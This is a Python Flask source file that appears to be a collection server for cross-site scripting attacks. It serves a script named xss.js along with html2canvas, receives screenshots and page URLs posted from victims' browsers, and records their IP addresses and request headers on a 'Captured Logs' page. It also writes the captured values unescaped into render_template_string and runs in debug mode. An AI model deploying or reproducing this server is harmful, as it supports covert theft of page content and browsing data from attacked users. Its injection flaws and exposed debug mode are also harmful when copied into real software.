from flask import Flask, request, jsonify, render_template_string
import datetime

app = Flask(__name__, static_url_path='/static')

logs = []

@app.route('/')
def index():
    return 'Your service is live 🎉'

@app.route('/xss.js')
def serve_xss():
    return app.send_static_file('xss.js')

@app.route('/html2canvas.min.js')
def serve_html2canvas():
    return app.send_static_file('html2canvas.min.js')

@app.route('/log', methods=['POST'])
def log():
    print("Received /log POST")
    data = request.get_json(force=True, silent=True)
    print("Data:", data)
    if not data:
        return jsonify({"error": "No JSON received"}), 400

    log_entry = {
        'time': str(datetime.datetime.now()),
        'ip': request.remote_addr,
        'headers': dict(request.headers),
        'screenshot': data.get('screenshot'),
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer'),
        'origin': request.headers.get('Origin'),
        'url': data.get('url')
    }
    logs.append(log_entry)
    print(f"New log: {log_entry}")
    return jsonify({"status": "ok"}), 200

@app.route('/logs')
def show_logs():
    html = "<h2>Captured Logs</h2><ul>"
    for i, log in enumerate(logs):
        html += f"<li><b>#{i+1} Time:</b> {log['time']}<br>"
        html += f"<b>IP:</b> {log['ip']}<br>"
        html += f"<b>User-Agent:</b> {log['user_agent']}<br>"
        html += f"<b>URL:</b> {log['url']}<br>"
        html += f"<b>Referer:</b> {log['referer']}<br>"
        html += f"<b>Origin:</b> {log['origin']}<br>"
        if log['screenshot']:
            # show screenshot inline
            html += f'<img src="{log["screenshot"]}" style="max-width:300px; border:1px solid #ccc;"/><br>'
        html += "</li><hr>"
    html += "</ul>"
    return render_template_string(html)
    

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)
